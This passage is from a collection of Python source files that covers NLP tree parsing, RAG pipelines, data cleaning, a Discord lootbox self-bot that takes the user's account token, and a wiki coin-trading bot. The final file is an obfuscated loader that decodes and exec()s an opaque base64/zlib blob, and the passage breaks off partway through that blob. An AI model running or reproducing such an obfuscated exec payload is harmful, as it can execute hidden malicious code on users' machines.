cleaned_tree_string = self.remove_non_terminal_labels(tree_string)\n        bracket_string = cleaned_tree_string.replace(\")\", \"}\").replace(\"(\", \"{\")\n        return bracket_string\n\n    def get_bracketed_string(self, sentence: str) -> str:\n        \"\"\"\n        Gets the bracket string representation of a sentence's constituency tree.\n        \n        Args:\n        sentence (str): The sentence to process.\n        \n        Returns:\n        str: The bracket string representation of the constituency tree.\n        \"\"\"\n        tree = self.get_constituency_tree(sentence)\n        return self.nltk_tree_to_bracket_string(tree)\n\n    def get_nltk_tree(self, sentence: str) -> NLTKTree:\n        \"\"\"\n        Gets the NLTK tree representation of a sentence's constituency tree.\n        \n        Args:\n        sentence (str): The sentence to process.\n        \n        Returns:\n        NLTKTree: The NLTK tree of the constituency tree.\n        \"\"\"\n        return self.get_constituency_tree(sentence)\n\n    def draw_and_save_tree(self, sentence: str, filepath: str):\n        \"\"\"\n        Draws the constituency tree of a sentence and saves it to a file.\n        \n        Args:\n        sentence (str): The sentence to process.\n        filepath (str): The path to the file where the tree visualization will be save",
    "from langchain_community.document_loaders import TextLoader\nfrom langchain.text_splitter import CharacterTextSplitter\nfrom langchain_community.vectorstores import Chroma\nimport git\nimport os\nimport json\nfrom langchain_community.chat_models import ChatOllama\nfrom queue import Queue\nimport shutil\nfrom urllib.parse import urlparse\nimport configparser\nfrom langchain_community.embeddings import HuggingFaceEmbeddings\nfrom langchain_community.chat_models import ChatOllama\nfrom langchain.chains import ConversationalRetrievalChain\nfrom langchain.callbacks.streaming_stdout import StreamingStdOutCallbackHandler\n\n\n# read from the config.ini\nconfig_path = os.path.join('config', 'config.ini')\nconfig = configparser.ConfigParser()\nconfig.read(config_path)\nllm_selected_model = config.get('llm_models', 'selected_model')\nembedding_selected_model = config.get('embedding_models', 'selected_model')\nvectorstore_dir = config.get('the_project_dirs', 'vectorstore_dir')\nsessions_dir = config.get('the_project_dirs', 'sessions_dir')\nproject_dir = config.get('the_project_dirs', 'project_dir')\nmax_dir_depth = config.get('for_loop_dirs_depth', 'max_dir_depth')\nchunk_size = config.get('chunk_setting', 'chunk_size')\nchunk_overlap = config.get('chunk_setting', 'chunk_overlap')\n\nencode_kwargs = {\"normalize_embeddings\": False}\nmodel_kwargs = {\"device\": \"cuda:0\"}  \nallowed_extensions = ['.py', '.md', '.log']\n\n\n# Update the selected model when modify\ndef update_llm_selected_model(selected_model):\n    config = configparser.ConfigParser()\n    config.read(config_path)\n    config.set('llm_models', 'selected_model', selected_model)\n    with open(config_path, 'w') as configfile:\n        config.write(configfile)\n\n\n# scan the the repo name file\ndef scan_vectorstore_for_repos():\n    # define repo_info.json path\n    repo_info_path = os.path.join(sessions_dir, 'repo_info.json')\n\n    # load repo info from repo_info.json\n    try:\n        if os.path.exists(repo_info_path):\n            with open(repo_info_path, 'r') as file:\n                data = json.load(file)\n                # get the repo list and return\n                return [repo['name'] for repo in data.get('repos', [])]\n        else:\n            print(f\"{repo_info_path} does not exist.\")\n            return []\n    except json.JSONDecodeError as e:\n        print(f\"Error reading {repo_info_path}: {e}\")\n        return []\n\n# remove the repo name and store path from json\ndef remove_repo_from_json(repo_name):\n    repo_info_path = os.path.join(sessions_dir, 'repo_info.json')\n    \n    # load repo_info.json\n    try:\n        if os.path.exists(repo_info_path):\n            with open(repo_info_path, 'r') as file:\n                data = json.load(file)\n            \n            # check and remove\n            repos = data.get('repos', [])\n            repos = [repo for repo in repos if repo['name'] != repo_name]\n            \n            # update\n            data['repos'] = repos\n            \n            # persistent the update\n            with open(repo_info_path, 'w') as file:\n                json.dump(data, file, indent=4)\n                \n            print(f\"Repository {repo_name} has been removed from {repo_info_path}.\")\n        else:\n            print(f\"{repo_info_path} does not exist.\")\n    except json.JSONDecodeError as e:\n        print(f\"Error reading or writing {repo_info_path}: {e}\")\n\n\n# save the chat history\ndef save_session(session, repo_name):\n    os.makedirs(sessions_dir, exist_ok=True) \n    session_file_path = os.path.join(sessions_dir, f'{repo_name}.json')\n    with open(session_file_path, 'w') as f:\n        json.dump(session, f)\n\n\n# load the chat history\ndef load_session(repo_name):\n    session_file_path = os.path.join(sessions_dir, f'{repo_name}.json')\n    try:\n        with open(session_file_path, 'r') as f:\n            return json.load(f)\n    except FileNotFoundError:\n        return []  \n\n\n# update the repo and repo url mapping\ndef update_repo_urls(repo_name, repo_url=None, action=\"add\"):\n    os.makedirs(sessions_dir, exist_ok=True)\n    repo_urls_path = os.path.join(sessions_dir, 'repo_urls.json')\n    # load repo_urls\n    try:\n        if os.path.exists(repo_urls_path):\n            with open(repo_urls_path, \"r\") as file:\n                repo_urls = json.load(file)\n        else:\n            repo_urls = {}\n    except json.JSONDecodeError:\n        repo_urls = {}\n\n    # update repo_urls\n    if action == \"add\" and repo_url is not None:\n        # add when update\n        repo_urls[repo_name] = repo_url\n    elif action == \"delete\":\n        # remove it\n        repo_urls.pop(repo_name, None)\n\n    # save\n    with open(repo_urls_path, \"w\") as file:\n        json.dump(repo_urls, file)\n\n\n# load the repo and url mapping\ndef load_repo_urls():\n    repo_urls_path = os.path.join(sessions_dir, f'repo_urls.json')\n    try:\n        with open(repo_urls_path, \"r\") as file:\n            return json.load(file)\n    except FileNotFoundError:\n        return {}  \n\n\n# remove the directories for the download/upload projects\ndef remove_",
    "import json\n\n# Load your file\nwith open('grouped_answers0730.json', 'r') as f:\n    data = json.load(f)\n\n# Define the substrings to remove\nsubstrings_to_remove = ['Answer:', 'Question:', 'Summary:', 'question:', 'answer:', 'summary']\n\n# Iterate over every key and list in the dictionary\nfor key in data:\n    for i in range(len(data[key])):\n        # Iterate over every substring to remove\n        for substring in substrings_to_remove:\n            # If the substring is in the list item, remove it\n            data[key][i] = data[key][i].replace(substring, '')\n\ndef replace_substrings(data, replacements):\n    for key in data:\n        for i in range(len(data[key])):\n            for old, new in replacements.items():\n                data[key][i] = data[key][i].replace(old, new)\n    return data\n\n# Define your replacement dictionary here. For example:\nreplacements = {\n    'Answer:': 'Response:',\n    'Question:': 'Query:',\n    'Summary:': 'Overview:',\n    'answer:': 'response:',\n    'question:': 'query:',\n    'summary:': 'overview:',\n}\n\ndata = replace_substrings(data, replacements)\n\n# Save the cleaned data back into the file\nwith open('grouped_answers0802.json', 'w') as f:\n    json.dump(data, f)\n",
    "import requests\nimport time\nimport sys\nimport base64\nimport json\nfrom colorama import Fore, Style\n\nAPI_URL = \"https://discord.com/api/v9\"\n\nclass LootboxBot:\n    LOOTBOX_ITEMS = {\n        \"1214340999644446723\": \"\ud83d\udc62 Speed Boost\",\n        \"1214340999644446724\": '\ud83e\ude88 \u2192\u2191\u2193\u2192\u2191\u2193',\n        \"1214340999644446722\": '\ud83d\udc22 Wump Shell',\n        \"1214340999644446728\": '\ud83d\udd28 Dream Hammer',\n        \"1214340999644446725\": '\u26d1\ufe0f Power Helmet',\n        \"1214340999644446726\": '\ud83e\udd86 Quack!!',\n        \"1214340999644446721\": '\ud83e\uddf8 Cute Plushie',\n        \"1214340999644446727\": '\ud83c\udf4c OHHHHH BANANA',\n        \"1214340999644446720\": '\ud83d\udde1\ufe0f Buster Blade',\n    }\n\n    unlocked_items = []\n\n    def __init__(self, token):\n        self.headers = get_headers(token)\n\n    def open_lootbox(self):\n        response = requests.post(f\"{API_URL}/users/@me/lootboxes/open\", headers=self.headers)\n\n        data = response.json()\n\n        if data[\"opened_item\"] not in self.unlocked_items:\n            print(f\"{Fore.GREEN}[\ud83c\udf81] Unlocked a NEW lootbox item: {Fore.MAGENTA}{self.LOOTBOX_ITEMS[data['opened_item']]}{Style.RESET_ALL}\")\n            self.unlocked_items.append(data[\"opened_item\"])\n        else:\n            print(f\"{Fore.RED}[\ud83c\udf81] Found an old lootbox item: {Fore.MAGENTA}{self.LOOTBOX_ITEMS[data['opened_item']]}{Style.RESET_ALL}\")\n\n        time.sleep(5)\n\n    def redeem_prize(self):\n        response = requests.post(f\"{API_URL}/users/@me/lootboxes/redeem-prize\", headers=self.headers)\n        if response.json()[\"redeemed_prize\"]:\n            print(f'[\ud83e\udd21] Automatically redeemed reward: \"I\\'m a Clown\" Avatar Decoration')\n\n    def log_stats(self, items):\n        print(f\"\\n{Fore.CYAN}[\ud83d\udcc8] Statistics{Style.RESET_ALL}\")\n\n        for key, value in items.items():\n            lootbox_item = self.LOOTBOX_ITEMS[key]\n            print(f\"{Style.BRIGHT}{lootbox_item}{Style.RESET_ALL}: {value} found\")\n\n        total = sum(list(items.values()))\n        print(f\"{Style.BRIGHT}Total{Style.RESET_ALL}: {total} items found\\n\")\n\n    def run(self):\n        response = requests.get(f\"{API_URL}/users/@me/lootboxes\", headers=self.headers)\n\n        data = response.json()\n\n        for item in data['opened_items']:\n            self.unlocked_items.append(item)\n\n        while not len(self.unlocked_items) >= len(self.LOOTBOX_ITEMS):\n            self.open_lootbox()\n\n        print(f\"\\n{Fore.YELLOW}[\ud83c\udf89] You have unlocked all 9 available items and won the final prize!{Style.RESET_ALL}\")\n\n        response = requests.get(f\"{API_URL}/users/@me/lootboxes\", headers=self.headers)\n\n        data = response.json()\n\n        if not data[\"redeemed_prize\"]:\n            self.redeem_prize()\n        \n        self.log_stats(data['opened_items'])\n\ndef get_headers(token):\n    x_super_properties = {\n        \"os\": \"Windows\",\n        \"client_build_number\": 280472\n    }\n\n    encoded_properties = base64.b64encode(json.dumps(x_super_properties).encode('utf-8')).decode('utf-8')\n\n    return {\n        \"x-super-properties\": encoded_properties,\n        \"referrer\": \"https://discord.com/channels/@me\",\n        \"authorization\": token,\n    }\n\ndef main():\n    valid_token = False\n\n    while not valid_token:\n\n        token = input(f\"{Fore.GREEN}[\ud83d\udd11] Paste your Discord token: {Style.RESET_ALL}\").strip('\"').strip('\\'')\n\n        response = requests.get(f\"{API_URL}/users/@me\", headers=get_headers(token))\n\n        if response.status_code == 200:\n            valid_token = True\n        elif response.status_code == 401:\n            print(f\"{Fore.RED}[\u26a0\ufe0f] Invalid token! Try again...{Style.RESET_ALL}\")\n\n    print(f\"\\n{Fore.GREEN}[\ud83d\udc64] Logged in as: {Fore.MAGENTA}{response.json()['username']}{Style.RESET_ALL}\\n\")\n    bot = LootboxBot(token)\n    bot.run()\n\nif __name__ == \"__main__\":\n\n    banner = f\"\"\"{Fore.YELLOW}\n  ____  _                       _    _                _   _                  ____        _   \n |  _ \\(_)___  ___ ___  _ __ __| |  | |    ___   ___ | |_| |__   _____  __  | __ )  ___ | |_ \n | | | | / __|/ __/ _ \\| '__/ _` |  | |   / _ \\ / _ \\| __| '_ \\ / _ \\ \\/ /  |  _ \\ / _ \\| __|\n | |_| | \\__ \\ (_| (_) | | | (_| |  | |__| (_) | (_) | |_| |_) | (_) >  <   | |_) | (_) | |_ \n |____/|_|___/\\___\\___/|_|  \\__,_|  |_____\\___/ \\___/ \\__|_.__/ \\___/_/\\_\\  |____/ \\___/ \\__| {Style.RESET_ALL}by scp222thj\n \"\"\"\n\n    print(banner)\n\n    try:\n        main()\n    except KeyboardInterrupt:\n        print(Style.RESET_ALL)\n        sys.exit()\n    except Exception as e:\n        print(f\"{Style.RESET_ALL}\\n{e}\")\n        sys.exit()",
    "import requests\nimport json\nimport time\nfrom datetime import datetime\n\n\ndef delay():\n    time.sleep(0.5)\n\n\nclass AutoCoin:\n    def __init__(self):\n        # \uc785\ub825 \ubc1b\ub294 \uac12\n        self.username = input(\"\ubd80\ub9c8\uc704\ud0a4 \uc544\uc774\ub514 \uc785\ub825: \")\n        self.password = input(\"\ubd80\ub9c8\uc704\ud0a4 \ube44\ubc00\ubc88\ud638 \uc785\ub825: \")\n        self.want_buy_price = input(\"\uc6d0\ud558\ub294 \ub9e4\uc218 \uac00\uaca9 \uc544\ub798\ub85c: \")\n        self.want_sell_price = input(\"\uc6d0\ud558\ub294 \ub9e4\ub3c4 \uac00\uaca9 \uc704\ub85c: \")\n\n        self.access_token = None\n        self.access_refreshToken = None\n\n        self.price = 0\n        self.property = 0  # \ud604\uc7ac \uc7ac\uc0b0\n        self.have_coins = 0  # \ud604\uc7ac \ubcf4\uc720 \ucf54\uc778 \uc218\n\n        # URL list\n        self.urls = {\n            \"bsm_login\": \"https://auth.bssm.kro.kr/api/auth/login\",  # \ubd80\ub9c8\uc704\ud0a4\uc5d0 \uc811\uadfc\ud558\uae30 \uc704\ud55c token \uac00\uc838\uc634\n            \"bsm_auth_token\": \"https://auth.bssm.kro.kr/api/oauth/authorize\",  # bsm token\n            \"buma_auth_token\": \"https://buma.wiki/api/auth/oauth/bsm\",  # buman token\n            \"mine\": \"https://buma.wiki/api/coins/mine\",\n            \"coin_price\": \"https://buma.wiki/api/coins/prices\",  # \ubd80\ub9c8\uc704\ud0a4 \ucf54\uc778 \uac00\uaca9 \ud655\uc778\n            \"buy_coin\": \"https://buma.wiki/api/coins/buy\",  # \ucf54\uc778 \ub9e4\uc218\n            \"sell_coin\": \"https://buma.wiki/api/coins/sell\"  # \ucf54\uc778 \ub9e4\ub3c4\n        }\n\n    def show_user_info(self):  # \uc720\uc800\uac00 \uc785\ub825\ud55c \uc815\ubcf4 \ud655\uc778\ud558\ub294 \ud398\uc774\uc9c0\n        text = f\"\"\"\n        \\n\n        ## \uc785\ub825\ub41c \uc815\ubcf4\ub294 \ub2e4\uc74c\uacfc \uac19\uc2b5\ub2c8\ub2e4. ## \n\n        \uc720\uc800 \uc774\ub984: {self.username}\n        \uc6d0\ud558\ub294 \ub9e4\uc218 \uac00\uaca9 \uc774\ud558 \uac12: {self.want_buy_price}\n        \uc6d0\ud558\ub294 \ub9e4\ub3c4 \uac00\uaca9 \uc774\uc0c1 \uac12: {self.want_sell_price}\n\n        \"\"\"\n        print(text)\n\n    def main(self):  # \ubd80\ub9c8\uc704\ud0a4 \ub85c\uadf8\uc778 \ud568\uc218\n        try:\n            login_data = {\n                \"id\": str(self.username),\n                \"pw\": str(self.password)\n            }\n            login_response = requests.post(str(self.urls[\"bsm_login\"]), json=login_data)\n\n            if login_response.status_code == 200:\n                login_json_response = login_response.json()\n                self.access_token = login_json_response.get(\"accessToken\")\n                self.access_refreshToken = login_json_response.get(\"refreshToken\")\n\n                # self.show_user_info()\n\n                self.get_token()\n                self.mine()\n                self.get_coin_price()\n\n                if self.price <= int(self.want_buy_price):\n                    self.buy()\n\n                if self.price >= int(self.want_sell_price):\n                    self.sell()\n\n                time.sleep(180)\n\n            else:\n                print(\"\uc720\uc800 \uc815\ubcf4\ub97c \ub2e4\uc2dc \ud655\uc778 \ubc14\ub78d\ub2c8\ub2e4.\")\n                exit()\n\n        except requests.exceptions.RequestException as e:\n            print(\"\uc11c\ubc84\uc5d0 \uc5f0\uacb0\ud560 \uc218 \uc5c6\uc74c.\")\n\n    def get_token(self):  # \ud1a0\ud070 \uac00\uc838\uc624\ub294 \ud568\uc218\n        headers = {\n            'Cookie': f'bsm_auth_refresh_token_v1={self.access_refreshToken}; bsm_auth_token_v1={self.access_token}',\n        }\n\n        data = {\"clientId\": \"22fb2e30\", \"redirectURI\": \"https://buma.wiki/oauth\"}\n        response_auth = requests.post(self.urls[\"bsm_auth_token\"], headers=headers, json=data)\n\n        text = response_auth.text\n        result = text[45:77]\n\n        # token \uc694\uccad\n        headers = {\n            'Cookie': f'bsm_auth_refresh_token_v1={self.access_refreshToken}; bsm_auth_token_v1={self.access_token}',\n            'Authcode': f'{result}',\n        }\n\n        data = {\"clientId\": \"22fb2e30\", \"redirectURI\": \"https://buma.wiki/oauth\"}\n        response_token = requests.post(self.urls[\"buma_auth_token\"], json=data, headers=headers)\n\n        data = response_token.text\n        parsed_data = json.loads(data)\n\n        self.access_token = parsed_data[\"accessToken\"]\n        # print(self.access_token) token \ud655\uc778\n\n    def get_coin_price(self):  # \ucf54\uc778 \uac00\uaca9 \uac00\uc838\uc624\ub294 \ud568\uc218\n        response = requests.get(self.urls[\"coin_price\"])\n\n        if response.status_code == 200:\n            json_data = response.json()\n            self.price = json_data[\"price\"]\n            print(f\"{datetime.now()}  \ucf54\uc778 \uac00\uaca9: {self.price}\")\n        else:\n            print('Failed to retrieve the page. Status code:', response.status_code)\n\n    def mine(self):\n        headers = {\n            \"Authorization\": f\"{self.access_token}\"\n        }\n\n        response = requests.get(self.urls[\"mine\"], headers=headers)\n\n        if response.status_code == 200:\n            json_data = response.json()\n            self.property = json_data[\"money\"]\n            self.have_coins = json_data[\"coin\"]\n        else:\n            print('Failed to retrieve the page. Status code:', response.status_code)\n\n    def buy(self):  # \ub9e4\uc218 \ud568\uc218\n        headers = {\n            \"Authorization\": f\"{self.access_token}\"\n        }\n\n        coin_data = {\n            'coinPrice': self.price,\n            'coinCount': self.property // self.price  # \uc804\uc7ac\uc0b0 // \ud604\uc7ac \uac00\uaca9 = \ud480\ub9e4\uc218\n        }\n\n        coin_response = requests.post(self.urls[\"buy_coin\"], json=coin_data, headers=headers)\n\n        if coin_response.status_code == 200:\n            print(f\"- \ucf54\uc778\uc744 {self.property // self.price}\uc8fc \ub9e4\uc218\ud558\uc600\uc2b5\ub2c8\ub2e4.\\n\")\n\n    def sell(self):  # \ub9e4\ub3c4 \ud568\uc218\n        headers = {\n            \"Authorization\": f\"{self.access_token}\"\n        }\n\n        coin_data = {\n            'coinCount': self.have_coins,\n            'coinPrice': self.price\n      ",
    "# Import modules\r\nimport os\r\nimport sys\r\nimport dspy\r\nimport pkg_resources\r\nfrom dspy import Signature, InputField, OutputField, Module, Predict, Prediction\r\nfrom llama_parse import LlamaParse\r\nfrom llama_index.core import VectorStoreIndex, StorageContext, load_index_from_storage\r\nfrom dspy.teleprompt import BootstrapFewShot\r\nfrom dspy.evaluate import answer_exact_match, answer_passage_match\r\nfrom dspy import Example\r\n\r\n# Set environmental variables\r\nos.environ[\"OPENAI_API_KEY\"] = \"sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx7M\"\r\nopenai_api_key = os.environ[\"OPENAI_API_KEY\"]\r\n\r\n# Define path to project\r\nrepo_path = 'C:\\\\Users\\\\user\\\\Documents\\\\Jan 2024\\\\Projects\\\\RAGs\\\\New\\\\DSPy\\\\DSPyRAG'\r\n\r\n# Add the project path to your system path\r\nif repo_path not in sys.path:\r\n    sys.path.append(repo_path)\r\n\r\n# Set up the cache for this script\r\nos.environ[\"DSP_NOTEBOOK_CACHEDIR\"] = os.path.join(repo_path, 'cache')\r\n\r\n# Check if dspy-ai is installed\r\nif not \"dspy-ai\" in {pkg.key for pkg in pkg_resources.working_set}:\r\n    print(\"Please install dspy-ai and openai using pip\")\r\n\r\n# Configure LM\r\nturbo = dspy.OpenAI(model='gpt-3.5-turbo')\r\ndspy.settings.configure(lm=turbo)\r\n\r\n# Parse file\r\nparser = LlamaParse(\r\n    api_key=\"llx-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxGh7\",\r\n        result_type=\"text\",\r\n        language=\"en\",\r\n        varbose=True\r\n    )\r\n\r\n# Create documents and index\r\ndocuments = parser.load_data(\"C:\\\\Users\\\\user\\\\Documents\\\\Jan 2024\\\\Projects\\\\RAGs\\\\Files\\\\PhilDataset.pdf\")\r\nprint(\"Documents created\")\r\nindex = VectorStoreIndex.from_documents(documents)\r\n\r\nindex.set_index_id(\"vector_index\")\r\nindex.storage_context.persist(\"./storage\")\r\n\r\nstorage_context = StorageContext.from_defaults(persist_dir=\"storage\")\r\n\r\n# Create query engine as index\r\nindex = load_index_from_storage(storage_context, index_id=\"vector_index\")\r\nquery_engine = index.as_query_engine(response_mode=\"tree_summarize\")\r\n\r\n# Create signature\r\nclass GenerateAnswer(dspy.Signature):\r\n    \"\"\"Answer questions with short factoid answers.\"\"\"\r\n    context = dspy.InputField(desc=\"may contain relevant facts\")\r\n    question = dspy.InputField()\r\n    answer = dspy.OutputField(desc=\"Often between 5 and 10 words\")\r\n    print(\"Class 1 created\")\r\n\r\n# Define modules\r\nclass RAG(dspy.Module):\r\n    def __init__(self, num_passages=3):\r\n        super().__init__()\r\n        self.query_engine = query_engine\r\n        self.generate_answer = Predict(GenerateAnswer)\r\n        print(\"Class 2 created\")\r\n\r\n    def forward(self, question):\r\n        response = self.query_engine.query(question)\r\n        context = response.response\r\n        prediction = self.generate_answer(context=context, question=question)\r\n        return dspy.Prediction(context=context, answer=prediction.answer)\r\ncustom_rag = RAG(query_engine)\r\n\r\nquestion = \"What did Phil wanted to become when he grew up?\"\r\npred = custom_rag(question)\r\nprint(f\"Question: {question}\")\r\nprint(f\"Predicted Answer: {pred.answer}\")\r\n\r\n# Create validation logic \r\ndef validate_context_and_answer(example, pred, trace=None):\r\n    answer_EM = answer_exact_match(example, pred)\r\n    answer_PM = answer_passage_match(example, pred)\r\n    return answer_EM and answer_PM\r\n\r\n# Define examples with the necessary fields\r\ntrain_example1 = Example(question=\"What did young Philemon wanted to become when he grew up?\", answer=\"Engineer\")\r\ntrain_example2 = Example(question=\"What did Philemon realize his curiosity was pushing him towards as he grew older?\", answer=\"Sciences\")\r\ntrain_example3 = Example(question=\"How many years after graduation did Philemon spent working in the academic writing industry?\", answer=\"Eight\")\r\ntrain_example4 = Example(question=\"Which is one of the subjects that Philemon handled in academic writing assignments?\", answer=\"Nursing\")\r\ntrain_example5 = Example(question=\"What made the global academic system to go into hibernation?\", answer=\"Covid\")\r\ntrain_example6 = Example(question=\"Which year did the usual peak season failed to materialize?\", answer=\"2021\")\r\ntrain_example7 = Example(question=\"When was the ranking systems introduced to deny all other writers the chance to see available orders?\", answer=\"2023\")\r\ntrain_example8 = Example(question=\"In 2024, how many orders had Philemon completed until February 15?\", answer=\"4\")\r\ntrain_example9 = Example(question=\"What was the main reason Philemon wanted to branch into other high-demand fields?\", answer=\"Income\")\r\ntrain_example10 = Example(question=\"What did Philemon eventually venture into in his undergraduate studies?\", answer=\"Chemistry\")\r\n\r\n# Tell DSPy that the 'question' field is the input\r\ntrainset = [\r\n    train_example1.with_inputs('question'),\r\n    train_example2.with_inputs('question'),\r\n    train_example3.with_inputs('question'),\r\n    train_example4.with_inputs('question'),\r\n    train_example5.with_inputs('question'),\r\n    train_example6.with_inputs('question'),\r\n    train_example7.with_inputs('question'),\r\n    train_example8.with_inputs('question'),\r\n    train_example9.with_inputs('qu",
    "\n# Create by Mr. Pstar7 \n                    \n_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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